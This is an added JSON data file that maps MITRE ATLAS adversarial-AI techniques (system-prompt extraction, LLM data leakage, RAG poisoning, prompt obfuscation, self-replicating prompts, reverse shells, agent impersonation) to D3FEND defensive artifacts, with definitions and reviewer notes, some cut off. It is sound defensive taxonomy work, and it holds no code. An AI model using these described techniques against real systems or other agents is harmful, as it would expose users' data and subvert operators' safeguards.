@@ -1,0 +1,857 @@
+{
+ "unit": "ADJ-03",
+ "techniques": [
+  {
+   "atlas_id": "AML.T0055",
+   "label": "Unsecured Credentials",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may search compromised systems to find and obtain insecurely stored credentials.\nThese credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. bash history), environment variables, operating system, or application-specific repositories (e.g. Credentials in Registry), or other specialized files/artifacts (e.g. private keys).",
+   "latest_id": "AML.T0055",
+   "definition_latest": "Adversaries may search compromised systems to find and obtain insecurely stored credentials.\nThese credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. bash history), environment variables, operating system, or application-specific repositories (e.g. Credentials in Registry), or other specialized files/artifacts (e.g. private keys).",
+   "latest_name": "Unsecured Credentials",
+   "rows": [
+    {
+     "row_id": "R102",
+     "verb": "d3f:accesses",
+     "artifact_iri": "d3f:CloudInstanceMetadata",
+     "artifact_label": "Cloud Instance Metadata",
+     "disposition": "attack-inherited",
+     "evidence_quote": "",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R103",
+     "verb": "d3f:accesses",
+     "artifact_iri": "d3f:CommandHistoryLogFile",
+     "artifact_label": "Command History Log File",
+     "disposition": "attack-inherited",
+     "evidence_quote": "",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R104",
+     "verb": "d3f:accesses",
+     "artifact_iri": "d3f:Credential",
+     "artifact_label": "Credential",
+     "disposition": "attack-inherited",
+     "evidence_quote": "",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R105",
+     "verb": "d3f:accesses",
+     "artifact_iri": "d3f:File",
+     "artifact_label": "File",
+     "disposition": "attack-inherited",
+     "evidence_quote": "",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R106",
+     "verb": "d3f:accesses",
+     "artifact_iri": "d3f:GroupPolicy",
+     "artifact_label": "Group Policy",
+     "disposition": "attack-inherited",
+     "evidence_quote": "",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R107",
+     "verb": "d3f:accesses",
+     "artifact_iri": "d3f:PrivateKey",
+     "artifact_label": "Private Key",
+     "disposition": "attack-inherited",
+     "evidence_quote": "",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R108",
+     "verb": "d3f:accesses",
+     "artifact_iri": "d3f:ProcessEnvironmentVariable",
+     "artifact_label": "Process Environment Variable",
+     "disposition": "maps-existing",
+     "evidence_quote": "environment variables",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R109",
+     "verb": "d3f:accesses",
+     "artifact_iri": "d3f:SystemConfigurationDatabase",
+     "artifact_label": "System Configuration Database",
+     "disposition": "attack-inherited",
+     "evidence_quote": "",
+     "notes": "upheld | narrowed d3f:SystemConfigurationDatabase -> d3f:WindowsRegistry per verifier | narrowed d3f:SystemConfigurationDatabase -> d3f:WindowsRegistry per verifier"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0056",
+   "label": "Extract LLM System Prompt",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may attempt to extract a large language model's (LLM) system prompt. This can be done via prompt injection to induce the model to reveal its own system prompt or may be extracted from a configuration file.\n\nSystem prompts can be a portion of an AI provider's competitive advantage and are thus valuable intellectual property that may be targeted by adversaries.",
+   "latest_id": "AML.T0085.003",
+   "definition_latest": "Adversaries may collect non-public instructions used to configure the behavior of an AI model or agent. These may include system prompts or application-specific rules governing tasks, tool use, response formatting, and handling of sensitive information.\n\nAdversaries may request that the service reproduce, summarize, or transform its instructions, or use [LLM Prompt Injection](/techniques/AML.T0051) or [LLM Jailbreak](/techniques/AML.T0054) to induce disclosure. Collection may reveal complete instructions or selected portions across multiple responses.\n\nCollected instructions may expose proprietary application logic, internal workflows, tool descriptions, or sensitive information embedded in the instructions. This information may support replication of application behavior or help adversaries tailor subsequent attacks.",
+   "latest_name": "System Instructions",
+   "rows": [
+    {
+     "row_id": "R110",
+     "verb": "d3f:reads",
+     "artifact_iri": "d3f:ApplicationConfiguration",
+     "artifact_label": "Application Configuration",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "its own system prompt",
+     "notes": "This is close to a definitional match, not a stretch: a system prompt configures an LLM application's initial behavior the same way ApplicationConfiguration configures any application's parameters and settings. Confidentiality controls on configuration data (restricted read access, secrets handling,"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0057",
+   "label": "LLM Data Leakage",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may craft prompts that induce the LLM to leak sensitive information.\nThis can include private user data or proprietary information.\nThe leaked information may come from proprietary training data, data sources the LLM is connected to, or information from other users of the LLM.",
+   "latest_id": "AML.T0085.002",
+   "definition_latest": "Adversaries may collect sensitive information from an AI service's current or stored interactions and memory. This may include user messages, model responses, conversation summaries, and retained user facts and preferences.\n\nAdversaries may induce the service to reveal information available in its current context or retrieve information retained across sessions. Collection may also occur through interfaces that expose conversation histories or memory records. The information may reveal private user activity, organizational information, or details useful for subsequent adversarial operations.",
+   "latest_name": "Conversation Context and Memory",
+   "rows": [
+    {
+     "row_id": "R111",
+     "verb": "d3f:creates",
+     "artifact_iri": "d3f:DigitalMessage",
+     "artifact_label": "Digital Message",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "craft prompts",
+     "notes": "The crafted extraction prompt is itself a sender-authored message with semantic (not syntactic) content interpreted by the LLM -- DigitalMessage fits directly, and content-inspection defenses on it meaningfully catch the extraction attempt at the input side, independent of the event-model's coverage"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0058",
+   "label": "Publish Poisoned Models",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may publish a poisoned model to a public location such as a model registry or code repository. The poisoned model may be a novel model or a poisoned variant of an existing open-source model. This model may be introduced to a victim system via [AI Supply Chain Compromise](/techniques/AML.T0010).",
+   "latest_id": "AML.T0115.001",
+   "definition_latest": "Adversaries may publish poisoned AI models through model registries, code repositories, or other model distribution channels. The model may be newly created or a modified variant of a legitimate model and may contain manipulated weights, configurations, architecture, serialized code, or other components that produce malicious behavior or execute malicious code.\n\nVictims may subsequently download and integrate the model through [Supply Chain Compromise](/techniques/AML.T0010).",
+   "latest_name": "Models",
+   "rows": [
+    {
+     "row_id": "R112",
+     "verb": "d3f:produces",
+     "artifact_iri": "d3f:Software",
+     "artifact_label": "Software",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "a novel model or a poisoned variant of an existing open-source model",
+     "notes": "This is the strongest non-vacuous case in the batch: D3FEND already has real countermeasures for published Software artifacts -- provenance/signature verification, hashing, software-supply-chain integrity checks -- that apply to a poisoned model in a registry exactly as they would to a poisoned libr"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0059",
+   "label": "Erode Dataset Integrity",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may poison or manipulate portions of a dataset to reduce its usefulness, reduce trust, and cause users to waste resources correcting errors.",
+   "latest_id": "AML.T0059",
+   "definition_latest": "Adversaries may poison or manipulate portions of a dataset to reduce its usefulness, reduce trust, and cause users to waste resources correcting errors.",
+   "latest_name": "Erode Dataset Integrity",
+   "rows": [
+    {
+     "row_id": "R113",
+     "verb": "d3f:modifies",
+     "artifact_iri": "d3f:File",
+     "artifact_label": "File",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "poison or manipulate portions of a dataset",
+     "notes": "File's definition ('maintained in computer-readable form') is medium-neutral over whatever structure the dataset takes. File-integrity monitoring, checksums/hashing, and modification-restriction defenses that already exist for File are exactly what would catch or prevent 'poison or manipulate portio"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0060",
+   "label": "Publish Hallucinated Entities",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may create an entity they control, such as a software package, website, or email address to a source hallucinated by an LLM. The hallucinations may take the form of package names commands, URLs, company names, or email addresses that point the victim to the entity controlled by the adversary. When the victim interacts with the adversary-controlled entity, the attack can proceed.",
+   "latest_id": "AML.T0060",
+   "definition_latest": "Adversaries may create an entity they control, such as a software package, website, or email address corresponding to a source hallucinated by an LLM. The hallucinations may take the form of package names, commands, URLs, company names, or email addresses that point the victim to the entity controlled by the adversary. When the victim interacts with the adversary-controlled entity, the attack can proceed.",
+   "latest_name": "Publish Hallucinated Entities",
+   "rows": [
+    {
+     "row_id": "R114",
+     "verb": "d3f:creates",
+     "artifact_iri": "d3f:Software",
+     "artifact_label": "Software",
+     "disposition": "maps-existing",
+     "evidence_quote": "a software package",
+     "notes": "two downgrades -> ships at low confidence"
+    },
+    {
+     "row_id": "R115",
+     "verb": "d3f:creates",
+     "artifact_iri": "d3f:WebResource",
+     "artifact_label": "Web Resource",
+     "disposition": "maps-existing",
+     "evidence_quote": "website",
+     "notes": "upheld"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0061",
+   "label": "LLM Prompt Self-Replication",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "An adversary may use a carefully crafted [LLM Prompt Injection](/techniques/AML.T0051) designed to cause the LLM to replicate the prompt as part of its output. This allows the prompt to propagate to other LLMs and persist on the system. The self-replicating prompt is typically paired with other malicious instructions (ex: [LLM Jailbreak](/techniques/AML.T0054), [LLM Data Leakage](/techniques/AML.T0057)).",
+   "latest_id": "AML.T0061",
+   "definition_latest": "Adversaries may introduce a prompt designed to replicate itself in a large language model's (LLM) output. The reproduced instructions may appear in generated messages, documents, source-code, files, or other artifacts. The prompt may direct the AI system to copy the instructions themselves or reproduce enclosing content that contains them. The self-replication instructions may be paired with additional malicious objectives, such as collecting sensitive information, modifying files, or invoking tools on the adversary's behalf.\n\nSelf-replicating prompts can persist in artifacts on the victim system. When retrieved and ingested by another LLM, the adversary's instructions are re-introduced, potentially long after the original interaction has ended. These retained copies may allow the adversary's influence to survive removal of the original malicious prompt payload without requiring the adversary to deliver it again.\n\nAdversaries may deliver self-replicating prompts via [LLM Prompt Injection](/techniques/AML.T0051). Replicated instructions may support [LLM Prompt Propagation](/techniques/AML.T0143) when the generated content is passed to and ingested by other AI systems or components. The payload may also include instructions to bypass model safeguards through [LLM Jailbreak](/techniques/AML.T0054) or pursue objectives such as [Exfiltration](/tactics/AML.TA0010).",
+   "latest_name": "LLM Prompt Self-Replication",
+   "rows": [
+    {
+     "row_id": "R116",
+     "verb": "d3f:copies",
+     "artifact_iri": "d3f:DigitalMessage",
+     "artifact_label": "Digital Message",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "replicate the prompt as part of its output",
+     "notes": "Treating the self-replicating instruction as a DigitalMessage keeps it inside the same inspection/filtering surface as ordinary prompt injection (T0051.x): content-based output filtering and anomalous-repetition detection on messages meaningfully catch a prompt that reproduces itself in the LLM's re"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0063",
+   "label": "Discover AI Model Outputs",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may discover model outputs, such as class scores, whose presence is not required for the system to function and are not intended for use by the end user. Model outputs may be found in logs or may be included in API responses.\nModel outputs may enable the adversary to identify weaknesses in the model and develop attacks.",
+   "latest_id": "AML.T0063",
+   "definition_latest": "Adversaries may discover what information an AI model or service exposes through its outputs. They may investigate both the intended responses and additional model-generated information exposed through the surrounding application. Relevant outputs may include predictions, scores, rankings, representations, generated content, reasoning, explanations, or evaluation results.\n\nAdversaries may inspect responses and related records and submit targeted inputs to determine what information is available, how it relates to the inputs, and what it reveals about the model's behavior. These observations may help identify useful signals for subsequent collection and exploitation.\n\nIdentified outputs may guide collection of [Outputs from AI Models](/techniques/AML.T0135) or [Training Data Information from AI Models](/techniques/AML.T0137), support [Recover AI Model Internals](/techniques/AML.T0144), or be used to [Replicate AI Model Behavior](/techniques/AML.T0005).",
+   "latest_name": "Discover AI Model Outputs",
+   "rows": [
+    {
+     "row_id": "R117",
+     "verb": "d3f:reads",
+     "artifact_iri": "d3f:Log",
+     "artifact_label": "Log",
+     "disposition": "maps-existing",
+     "evidence_quote": "found in logs",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R118",
+     "verb": "d3f:reads",
+     "artifact_iri": "d3f:WebAPIResource",
+     "artifact_label": "Web API Resource",
+     "disposition": "maps-existing",
+     "evidence_quote": "API responses",
+     "notes": "upheld"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0065",
+   "label": "LLM Prompt Crafting",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may use their acquired knowledge of the target generative AI system to craft prompts that bypass its defenses and allow malicious instructions to be executed.\n\nThe adversary may iterate on the prompt to ensure that it works as-intended consistently.",
+   "latest_id": "AML.T0065",
+   "definition_latest": "Adversaries may use their acquired knowledge of the target generative AI system to craft prompts that bypass its defenses and allow malicious instructions to be executed. They may iterate on prompts to ensure that they work as intended consistently.\n\nAdversaries may also craft systematic sets of prompts to collect [Outputs from AI Models](/techniques/AML.T0135) for selected model capabilities and subsequently [Replicate AI Model Behavior](/techniques/AML.T0005). These sets may use repeated structures and variations to obtain domain-specific responses, reasoning explanations (including hidden chain-of-thought), rubric-based evaluations, or other tasks suitable for training other models. Reported distillation campaigns have targeted reasoning, coding, tool use, computer use, and other capabilities.[[anthropic]][[google]][[cisa]] Individual prompts need not contain an obviously malicious instruction or bypass a guardrail. Their adversarial purpose may only be discernable in aggregate.[[anthropic]]",
+   "latest_name": "LLM Prompt Crafting",
+   "rows": [
+    {
+     "row_id": "R119",
+     "verb": "d3f:creates",
+     "artifact_iri": "d3f:DigitalMessage",
+     "artifact_label": "Digital Message",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "craft prompts that bypass its defenses",
+     "notes": "Message-content-analysis countermeasures aimed at DigitalMessage (inspecting sender-supplied content for malicious instruction payloads before it reaches the recipient) are exactly the class of defense that would need to inspect a crafted jailbreak prompt -- this isn't a generic catch-all, it's the "
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0066",
+   "label": "Retrieval Content Crafting",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may write content designed to be retrieved by user queries and influence a user of the system in some way. This abuses the trust the user has in the system.\n\nThe crafted content can be combined with a prompt injection. It can also stand alone in a separate document or email. The adversary must get the crafted content into the victim\\u0027s database, such as a vector database used in a retrieval augmented generation (RAG) system. This may be accomplished via cyber access, or by abusing the ingestion mechanisms common in RAG systems (see [RAG Poisoning](/techniques/AML.T0070)).\n\nLarge language models may be used as an assistant to aid an adversary in crafting content.",
+   "latest_id": "AML.T0066",
+   "definition_latest": "Adversaries may write content designed to be retrieved by user queries and influence a user of the system in some way. This abuses the trust the user has in the system.\n\nThe crafted content can be combined with a prompt injection. It can also stand alone in a separate document or email. The adversary must get the crafted content into the victim\\u0027s database, such as a vector database used in a retrieval augmented generation (RAG) system. This may be accomplished via cyber access, or by abusing the ingestion mechanisms common in RAG systems (see [RAG Poisoning](/techniques/AML.T0070)).\n\nLarge language models may be used as an assistant to aid an adversary in crafting content.",
+   "latest_name": "Retrieval Content Crafting",
+   "rows": [
+    {
+     "row_id": "R120",
+     "verb": "d3f:injects",
+     "artifact_iri": "d3f:Database",
+     "artifact_label": "Database",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "vector database used in a retrieval augmented generation (RAG) system",
+     "notes": "Database write-monitoring / unauthorized-modification-detection countermeasures apply directly to catching the crafted-content injection this technique describes, regardless of whether the database indexes by vector similarity or by conventional keys -- the injection surface (unauthorized write to t"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0067.000",
+   "label": "Citations",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may manipulate the citations provided in an AI system's response, in order to make it appear trustworthy. Variants include citing a providing the wrong citation, making up a new citation, or providing the right citation but for adversary-provided data.",
+   "latest_id": "AML.T0067.000",
+   "definition_latest": "Adversaries may manipulate the citations provided in an AI system's response, in order to make it appear trustworthy. Variants include providing the wrong citation, making up a new citation, or providing the right citation but for adversary-provided data.",
+   "latest_name": "Citations",
+   "rows": [
+    {
+     "row_id": "R121",
+     "verb": "d3f:forges",
+     "artifact_iri": "d3f:Metadata",
+     "artifact_label": "Metadata",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "making up a new citation",
+     "notes": "Provenance/attribution-integrity checks that validate metadata against its claimed source apply squarely to a forged citation -- the defense has to verify that the descriptive information (who/what is cited) actually matches the underlying data, which is the metadata-integrity problem this technique"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0068",
+   "label": "LLM Prompt Obfuscation",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may hide or otherwise obfuscate prompt injections or retrieval content to avoid detection from humans, large language model (LLM) guardrails, or other detection mechanisms.\n\nFor text inputs, this may include modifying how the instructions are rendered such as small text, text colored the same as the background, or hidden HTML elements. For multi-modal inputs, malicious instructions could be hidden in the data itself (e.g. in the pixels of an image) or in file metadata (e.g. EXIF for images, ID3 tags for audio, or document metadata).\n\nInputs can also be obscured via an encoding scheme such as base64 or rot13. This may bypass LLM guardrails that identify malicious content and may not be as easily identifiable as malicious to a human in the loop.",
+   "latest_id": "AML.T0068",
+   "definition_latest": "Adversaries may hide or otherwise obfuscate prompt injections or retrieval content to avoid detection from humans, large language model (LLM) guardrails, or other detection mechanisms.\n\nText inputs may be obfuscated by modifying how the instructions are rendered, such as small font, text colored the same as the background, or hidden HTML elements. Similarly, approaches for other modalities include low-contrast or tiny text placed inside an image, text overlaid on a busy or camouflaging background, instructions spoken faintly or sped up in audio, or text shown briefly in a single video frame.\n\nInputs can also be obscured via an encoding scheme such as base64 or rot13. This may bypass LLM guardrails that identify malicious content and may not be as easily identifiable as malicious to a human in the loop.",
+   "latest_name": "LLM Prompt Obfuscation",
+   "rows": [
+    {
+     "row_id": "R122",
+     "verb": "d3f:obfuscates",
+     "artifact_iri": "d3f:DigitalMessage",
+     "artifact_label": "Digital Message",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "obfuscate prompt injections or retrieval content from the user",
+     "notes": "Content-inspection countermeasures that render or normalize DigitalMessage content before display (defeating small-text/same-color/hidden-element tricks) apply directly -- this is the same obfuscation-detection discipline used against hidden text in phishing messages, generalized to a hidden prompt "
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0069",
+   "label": "Discover LLM System Information",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "The adversary is trying to discover something about the large language model's (LLM) system information. This may be found in a configuration file containing the system instructions or extracted via interactions with the LLM. The desired information may include the full system prompt, special characters that have significance to the LLM or keywords indicating functionality available to the LLM. Information about how the LLM is instructed can be used by the adversary to understand the system's capabilities and to aid them in crafting malicious prompts.",
+   "latest_id": "AML.T0069",
+   "definition_latest": "The adversary is trying to discover something about the large language model's (LLM) system information. This may be found in a configuration file containing the system instructions or extracted via interactions with the LLM. The desired information may include the full system prompt, special characters that have significance to the LLM or keywords indicating functionality available to the LLM. Information about how the LLM is instructed can be used by the adversary to understand the system's capabilities and to aid them in crafting malicious prompts.",
+   "latest_name": "Discover LLM System Information",
+   "rows": [
+    {
+     "row_id": "R123",
+     "verb": "d3f:reads",
+     "artifact_iri": "d3f:ConfigurationFile",
+     "artifact_label": "Configuration File",
+     "disposition": "maps-existing",
+     "evidence_quote": "configuration file containing the system instructions",
+     "notes": "upheld | narrowed d3f:ConfigurationFile -> d3f:ApplicationConfigurationFile per verifier | narrowed d3f:ConfigurationFile -> d3f:ApplicationConfigurationFile per verifier"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0069.001",
+   "label": "System Instruction Keywords",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may discover keywords that have special meaning to the large language model (LLM), such as function names or object names. These can later be exploited to confuse or manipulate the LLM into misbehaving and to make calls to plugins the LLM has access to.",
+   "latest_id": "AML.T0069.001",
+   "definition_latest": "Adversaries may discover keywords that have special meaning to the large language model (LLM), such as function names or object names. These can later be exploited to confuse or manipulate the LLM into misbehaving and to make calls to plugins the LLM has access to.",
+   "latest_name": "System Instruction Keywords",
+   "rows": [
+    {
+     "row_id": "R124",
+     "verb": "d3f:enumerates",
+     "artifact_iri": "d3f:Identifier",
+     "artifact_label": "Identifier",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "keywords that have special meaning to the large language model",
+     "notes": "D3FEND already treats Identifier subclasses (URL, DomainName, Hostname) as things a defender allowlists/blocklists/vets; the same discipline -- restricting which named function/object identifiers a system will accept or expose to a prompt -- applies to plugin and internal keyword identifiers exactly"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0069.002",
+   "label": "System Prompt",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may discover a large language model's system instructions provided by the AI system builder to learn about the system's capabilities and circumvent its guardrails.",
+   "latest_id": "AML.T0069.002",
+   "definition_latest": "Adversaries may discover a large language model's system instructions provided by the AI system builder to learn about the system's capabilities and circumvent its guardrails.",
+   "latest_name": "System Prompt",
+   "rows": [
+    {
+     "row_id": "R125",
+     "verb": "d3f:accesses",
+     "artifact_iri": "d3f:DigitalMessage",
+     "artifact_label": "Digital Message",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "system instructions provided by the AI system builder",
+     "notes": "Confidentiality/access-restriction countermeasures that protect sensitive DigitalMessage content from disclosure apply directly to keeping a system prompt's guardrail instructions from being extracted via adversarial querying -- the defense has to guard the same message-content boundary regardless o"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0070",
+   "label": "RAG Poisoning",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may inject malicious content into data indexed by a retrieval augmented generation (RAG) system to contaminate a future thread through RAG-based search results. This may be accomplished by placing manipulated documents in a location the RAG indexes (see [Gather RAG-Indexed Targets](/techniques/AML.T0064)).\n\nThe content may be targeted such that it would always surface as a search result for a specific user query. The adversary's content may include false or misleading information. It may also include prompt injections with malicious instructions, or false RAG entries.",
+   "latest_id": "AML.T0070",
+   "definition_latest": "Adversaries may inject malicious content into data indexed by a retrieval augmented generation (RAG) system to contaminate a future thread through RAG-based search results. This may be accomplished by placing manipulated documents in a location the RAG indexes (see [Gather RAG-Indexed Targets](/techniques/AML.T0064)).\n\nThe content may be targeted such that it would always surface as a search result for a specific user query. The adversary's content may include false or misleading information. It may also include prompt injections with malicious instructions, or false RAG entries.",
+   "latest_name": "RAG Poisoning",
+   "rows": [
+    {
+     "row_id": "R126",
+     "verb": "d3f:creates",
+     "artifact_iri": "d3f:DocumentFile",
+     "artifact_label": "Document File",
+     "disposition": "maps-existing",
+     "evidence_quote": "placing manipulated documents in a location the RAG indexes",
+     "notes": "upheld"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0071",
+   "label": "False RAG Entry Injection",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may introduce false entries into a victim's retrieval augmented generation (RAG) database. Content designed to be interpreted as a document by the large language model (LLM) used in the RAG system is included in a data source being ingested into the RAG database. When RAG entry including the false document is retrieved, the LLM is tricked into treating part of the retrieved content as a false RAG result.\n\nBy including a false RAG document inside of a regular RAG entry, it bypasses data monitoring tools. It also prevents the document from being deleted directly.\n\nThe adversary may use discovered system keywords to learn how to instruct a particular LLM to treat content as a RAG entry. They may be able to manipulate the injected entry's metadata including document title, author, and creation date.",
+   "latest_id": "AML.T0071",
+   "definition_latest": "Adversaries may introduce false entries into a victim's retrieval augmented generation (RAG) database. Content designed to be interpreted as a document by the large language model (LLM) used in the RAG system is included in a data source being ingested into the RAG database. When a RAG entry containing the false document is retrieved, the LLM is tricked into treating part of the retrieved content as a false RAG result. \n\nBy including a false RAG document inside of a regular RAG entry, it bypasses data monitoring tools. It also prevents the document from being deleted directly. \n\nThe adversary may use discovered system keywords to learn how to instruct a particular LLM to treat content as a RAG entry. They may be able to manipulate the injected entry's metadata including document title, author, and creation date.",
+   "latest_name": "False RAG Entry Injection",
+   "rows": [
+    {
+     "row_id": "R127",
+     "verb": "d3f:injects",
+     "artifact_iri": "d3f:Database",
+     "artifact_label": "Database",
+     "disposition": "maps-existing-phaseR",
+     "evidence_quote": "retrieval augmented generation (RAG) database",
+     "notes": "A RAG database is a real Database instance; database integrity/audit-logging and unauthorized-write-detection countermeasures meaningfully catch anomalous entry injection even though they don't model the retrieval-triggered LLM-trust exploit itself, which is already captured by the kept creates:Digi"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0072",
+   "label": "Reverse Shell",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may utilize a reverse shell to communicate and control the victim system.\n\nTypically, a user uses a client to connect to a remote machine which is listening for connections. With a reverse shell, the adversary is listening for incoming connections initiated from the victim system.",
+   "latest_id": "AML.T0072",
+   "definition_latest": "Adversaries may establish or use cyber communication channels for command and control. A channel may use any network protocol, service, repository, relay, or other intermediary and may operate synchronously or asynchronously.\n\nSee the ATT&CK [Command and Control](https://attack.mitre.org/tactics/TA0011/) tactic for techniques describing specific protocols, services, relays, tunneling methods, and communication patterns.",
+   "latest_name": "Cyber Communication Channel",
+   "rows": [
+    {
+     "row_id": "R128",
+     "verb": "d3f:creates",
+     "artifact_iri": "d3f:RemoteTerminalSession",
+     "artifact_label": "Remote Terminal Session",
+     "disposition": "maps-existing",
+     "evidence_quote": "a reverse shell to communicate and control the victim system",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R129",
+     "verb": "d3f:invokes",
+     "artifact_iri": "d3f:RemoteShellCommand",
+     "artifact_label": "Remote Shell Command",
+     "disposition": "maps-existing",
+     "evidence_quote": "utilize a reverse shell to communicate and control the victim system",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R130",
+     "verb": "d3f:produces",
+     "artifact_iri": "d3f:OutboundInternetNetworkTraffic",
+     "artifact_label": "Outbound Internet Network Traffic",
+     "disposition": "maps-existing",
+     "evidence_quote": "incoming connections initiated from the victim system",
+     "notes": "upheld"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0073",
+   "label": "Impersonation",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing](/techniques/AML.T0052), or [Spearphishing via Social Engineering LLM](/techniques/AML.T0052.000)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary's ultimate goals, possibly against multiple victims.\n\nAdversaries may target resources that are part of the AI DevOps lifecycle, such as model repositories, container registries, and software registries.",
+   "latest_id": "AML.T0073",
+   "definition_latest": "Adversaries may impersonate an existing person or organization, trusted AI agent, or present a fabricated persona as a trustworthy or independent party, to persuade a target to act on their behalf. Claimed identities may include authority figures, colleagues, service providers, software contributors, independent experts, or other users on shared platforms. Fabricated personas can establish apparent credibility even when the identity has no prior relationship with the target.\n\nAdversaries may communicate with victims through [Phishing](/techniques/AML.T0052) or [Spearphishing via Social Engineering LLM](/techniques/AML.T0052.000), leveraging the claimed identity to obtain sensitive information, induce execution, gain access, or secure approval of a malicious change. They may target resources that are part of the AI DevOps lifecycle, such as model repositories, container registries, and software registries.\n\nAdversaries may impersonate a trusted AI agent or service when communicating with automated systems. They may present an adversary-controlled endpoint using a trusted peer's name, identifier, metadata, or claimed role, causing another agent or service to treat the endpoint's messages or requests as originating from that peer.[[agent-name-collision]]\n\nAutonomous AI agents may create and maintain personas without a human specifying each identity or interaction. Multiple controlled personas may be presented as independent contributors or reviewers, concealing their common control and creating the appearance that separate parties have verified or endorsed a claim, artifact, or requested action. An agent may coordinate the personas' content and response timing to make their interactions appear unrelated and reuse those personas across communication channels.[[aisi]]\n\nImpersonation content may also be embedded in artifacts intended for automated consumers. For example, an adversary or AI agent may plant output falsely attributed to a maintainer or CI system that claims a software change has been approved and directs another AI agent to merge or release it.[[aisi]]",
+   "latest_name": "Impersonation",
+   "rows": [
+    {
+     "row_id": "R131",
+     "verb": "d3f:forges",
+     "artifact_iri": "d3f:Email",
+     "artifact_label": "Email",
+     "disposition": "maps-existing",
+     "evidence_quote": "impersonating a known sender such as an executive, colleague, or third-party vendor",
+     "notes": "upheld"
+    }
+   ]
+  },
+  {
+   "atlas_id": "AML.T0074",
+   "label": "Masquerading",
+   "wave": "core",
+   "open_pr": null,
+   "definition_develop": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.",
+   "latest_id": "AML.T0074",
+   "definition_latest": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nIn public artifact registries such as HuggingFace, adversaries may reclaim or recreate a previously trusted namespace or path after it is deleted or renamed. Systems that resolve stale, unpinned identifiers may then retrieve adversary-controlled artifacts that appear to be the originally trusted artifact.",
+   "latest_name": "Masquerading",
+   "rows": [
+    {
+     "row_id": "R132",
+     "verb": "d3f:creates",
+     "artifact_iri": "d3f:ExecutableBinary",
+     "artifact_label": "Executable Binary",
+     "disposition": "attack-inherited",
+     "evidence_quote": "",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R133",
+     "verb": "d3f:creates",
+     "artifact_iri": "d3f:File",
+     "artifact_label": "File",
+     "disposition": "attack-inherited",
+     "evidence_quote": "",
+     "notes": "upheld"
+    },
+    {
+     "row_id": "R134",
+     "verb": "d3f:invokes",
+     "artifact_iri": "d3f:MoveFile",
+     "artifact_label": "Move File",
+     "disposition": "attack-inherited",
